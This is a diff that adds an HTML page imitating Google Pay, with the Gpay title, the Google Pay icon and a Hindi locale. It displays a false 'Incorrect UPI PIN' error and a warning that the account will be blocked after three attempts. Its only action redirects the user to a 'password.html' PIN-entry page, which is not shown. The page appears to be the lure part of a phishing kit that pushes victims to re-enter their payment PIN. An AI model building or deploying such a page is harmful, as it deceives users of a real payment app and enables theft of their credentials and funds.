@@ -1,0 +1,105 @@
+<!doctype html>
+<html lang="hi">
+
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+ <title>Gpay</title>
+  <link rel="icon" type="image/x-icon" href="Google_Pay_2018_icon.svg">
+  <style>
+    body {
+      margin: 0;
+      background: #0b0b0b;
+      color: #fff;
+      font-family: Arial, Helvetica, sans-serif;
+      min-height: 90vh;
+      display: flex;
+      flex-direction: column
+    }
+
+    .top {
+      padding: 18px 12px;
+    }
+
+    .back {
+      font-size: 22px;
+      opacity: .9;
+      cursor: pointer
+    }
+
+    .container {
+      padding: 12px 18px;
+      flex: 1
+    }
+
+    h1 {
+      font-size: 28px;
+      margin: 12px 0 8px
+    }
+
+    p.lead {
+      color: #d1d5db;
+      font-size: 16px;
+      line-height: 1.5
+    }
+
+    a.learn {
+      color: #8ab4ff;
+      text-decoration: underline;
+      cursor: pointer
+    }
+
+    .bottom {
+      padding: 18px;
+      background: transparent
+    }
+
+    .btn {
+      display: block;
+      margin: 0 auto;
+      background: #bfe0ff;
+      color: #012a4a;
+      padding: 14px 20px;
+      border-radius: 28px;
+      width: 90%;
+      max-width: 420px;
+      text-align: center;
+      font-weight: 700;
+      text-decoration: none
+    }
+  </style>
+</head>
+
+<body>
+
+
+  <div class="container" style="font-weight: bold;">
+    <br>
+    <h1 id="heading">Could not check balance</h1>
+    <br>
+    <p class="lead" id="message">
+      Incorrect UPI PIN. After 3 unsuccessful attempts, your account will be blocked for 24 hours.
+      <a class="learn" href="#">Learn more</a>
+    </p>
+  </div>
+
+  <div class="bottom">
+    <a id="retryBtn" class="btn" href="#" onclick="retry()">Enter UPI PIN again</a>
+  </div>
+
+  <script>
+    // Example behavior: click button -> go to pin entry (mock)
+    function retry() {
+      // redirect to mock PIN page (same folder)
+      window.location.href = 'password.html';
+    }
+
+    // If you want to change content via JS dynamically:
+    // document.getElementById('heading').innerText = 'नया शीर्षक';
+    // document.getElementById('message').innerText = 'नया संदेश';
+    // document.getElementById('retryBtn').innerText = 'नया बटन टेक्स्ट';
+  </script>
+
+</body>
+
+</html>
